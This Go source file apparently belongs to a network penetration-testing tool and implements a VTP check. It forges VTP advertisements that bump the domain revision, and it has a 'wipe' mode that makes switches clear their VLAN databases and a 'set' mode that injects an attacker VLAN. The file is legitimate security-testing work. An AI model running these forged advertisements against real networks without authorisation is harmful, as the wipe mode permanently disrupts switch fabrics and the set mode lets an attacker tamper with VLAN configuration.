// vtp.go implements the VTP (VLAN Trunking Protocol) check. The base entry
// is impact temporary, restore decay with no stated bound, affects fabric:
// the summary advertisement with a revision bump is superseded by the
// domain's next real advertisement. The wipe mode (a summary with
// revision 0 and no VLANs) and the set mode (a subset with the attacker's
// VLAN set) are impact permanent with no restore and run only with the
// per-run acknowledgment.

package l2

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	"go.aledante.io/FlowSeer/src/edge/netpen/layers"
)

type vtpFinding struct {
	Action   string `json:"action"`
	Domain   string `json:"domain"`
	Revision uint32 `json:"revision"`
	Mode     string `json:"mode"`
}

// RunVTP reads the leg for one summary advertisement from another sender
// in the target's VTP domain, sends its own advertisement from the attack
// leg's MAC with that revision plus one (the base and set modes) or zero
// (the wipe mode), and observes the next summary. The timestamp and VLAN
// set are probe content. The predicate is the revision the next summary
// carries: on the base and set modes a revision at or above the sent one
// confirms and the pre-read's revision again resists; on wipe a revision of
// 0 confirms and the pre-read's revision resists. No summary in the
// pre-read is pending with nothing sent, since there is no revision to
// bump, and none after the probe is pending. The pre-read is bounded by
// half the window because no vendored source states the summary interval.
func RunVTP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVTPDomain); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	mode := deps.Entry.Mode
	domain := deps.Target.VTPDomain

	var before *layers.VTP
	_, pre, err := check.First(ctx, deps.AttackLeg, deps.Observe/2, func(data []byte) bool {
		msg, ok := isVTPSummaryFrom(data, src, domain)
		if ok {
			before = msg
		}
		return ok
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "vtp: receive summary")
	}
	if before == nil {
		return check.Pending(fmt.Sprintf("no VTP summary for domain %s in %s", domain, pre.Elapsed.Round(time.Millisecond))), nil
	}
	revision := before.Revision + 1

	var vtp *layers.VTP
	switch mode {
	case "wipe":
		// Wipe: push a summary with revision 0 and no VLANs, causing
		// downstream switches to reset their VLAN database.
		revision = 0
		vtp = &layers.VTP{
			Version:  layers.VTPVersion1,
			Code:     layers.VTPCodeSummary,
			Domain:   domain,
			Revision: revision,
		}
	case "set":
		// Set: push a subset advertisement with the attacker's VLANs.
		vtp = &layers.VTP{
			Version:  layers.VTPVersion1,
			Code:     layers.VTPCodeSubset,
			Seq:      1,
			Domain:   domain,
			Revision: revision,
			VLANs: []layers.VTPVLANInfo{
				{VLANID: 10, Name: "attacker", MTU: 1500, Status: 0, Type: 1, ISLVLAN: 0, SAID: 0x10000A},
			},
		}
	default:
		// The base mode sends a summary advertisement with a revision
		// bump. The timestamp is a fixed value, so the fixture compares
		// bytes.
		vtp = &layers.VTP{
			Version:   layers.VTPVersion1,
			Code:      layers.VTPCodeSummary,
			Domain:    domain,
			Revision:  revision,
			Followers: 0,
			Timestamp: []byte("260823120000"),
		}
	}

	pkt, err := craftDot3SNAP(vtpDstMAC, src, snapPIDVTP, vtp)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "vtp: craft frame")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "vtp: send")
	}

	findingMode := mode
	if findingMode == "" {
		findingMode = "default"
	}
	detail, _ := json.Marshal(vtpFinding{
		Action:   "vtp-advertisement",
		Domain:   domain,
		Revision: vtp.Revision,
		Mode:     findingMode,
	})
	deps.Emitter.Finding("vtp", detail)

	var after *layers.VTP
	_, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe-pre.Elapsed, func(data []byte) bool {
		msg, ok := isVTPSummaryFrom(data, src, domain)
		if ok {
			after = msg
		}
		return ok
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "vtp: receive after the advertisement")
	}
	observed := pre.Elapsed + obs.Elapsed
	switch {
	case after == nil:
		return check.Pending(fmt.Sprintf("no summary in %s", obs.Elapsed.Round(time.Millisecond))), nil
	case mode == "wipe" && after.Revision == 0:
		return check.Confirmed(fmt.Sprintf("the domain %s advertises revision 0 after the wipe", domain), observed), nil
	case mode != "wipe" && after.Revision >= revision:
		return check.Confirmed(fmt.Sprintf("the domain %s advertises revision %d after the sent %d", domain, after.Revision, revision), observed), nil
	}
	return check.Resisted(fmt.Sprintf("the domain %s still advertises revision %d", domain, after.Revision), observed), nil
}
